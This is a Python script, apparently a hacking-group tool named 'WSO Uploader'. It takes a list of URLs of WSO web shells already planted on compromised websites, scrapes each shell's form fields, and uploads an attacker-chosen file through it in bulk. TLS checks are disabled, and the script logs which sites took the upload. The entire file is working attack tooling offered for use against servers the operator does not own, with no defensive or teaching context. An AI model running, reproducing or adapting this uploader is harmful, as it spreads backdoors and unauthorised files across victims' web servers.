import requests, re, os, crayons
from platform import system
from colorama import Fore, Style
from urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(InsecureRequestWarning)
PYTHONWARNINGS = "ignore:Unverified HTTPS request"

try:
    os.makedirs("result", exist_ok=True)
except:
    pass

def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')

def banner():
    print(f"""\
██╗    ██╗███████╗ ██████╗     ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗
██║    ██║██╔════╝██╔═══██╗    ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
██║ █╗ ██║███████╗██║   ██║    ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██║███╗██║╚════██║██║   ██║    ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
╚███╔███╔╝███████║╚██████╔╝    ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
 ╚══╝╚══╝ ╚══════╝ ╚═════╝      ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝

                                 {Fore.GREEN}WSO Uploader{Style.RESET_ALL} by {Fore.GREEN}Th3_Shak1b{Style.RESET_ALL} from {Fore.GREEN}TeaM_CC{Style.RESET_ALL}           """)


def wsoup(url, file):
    try:
        r1 = requests.get(url, verify=False)
        a = re.search("name=a value='(.*?)'", r1.text).group(1)
        c = re.search("name=c value='(.*?)'", r1.text).group(1)
        p1 = re.search("name=p1 value='(.*?)'", r1.text).group(1)
        charset = re.search("name=charset value='(.*?)'", r1.text).group(1)

        files = {'f': open(file, 'rb')}
        data = {'a': a,
            'c': c,
            'p1': p1,
            'charset': charset}

        r2 = requests.post(url, files=files, data=data,  verify=False)
        if r2.status_code == 200:
            urllist = url.split('/')
            urlpath = urllist.pop()
            newurl = url.replace(urlpath, file)
            print(f"[UP] => {newurl}  => Done")
            with open('result/working.txt', 'a') as w:
                w.write(newurl + '\n')

    except:
        print(f"[UP] => {url}  => Error")
        with open('result/error.txt', 'a') as w:
            w.write(url + '\n')

def main():
    clear()
    banner()
    listname = input('Enter list of shell : ').strip()
    upfile = input('Enter uploading file : ').strip()
    filelines = open(listname, 'r').read().splitlines()
    for line in filelines:
        lines = line.strip()
        wsoup(lines, upfile)

if __name__ == '__main__':

    main()
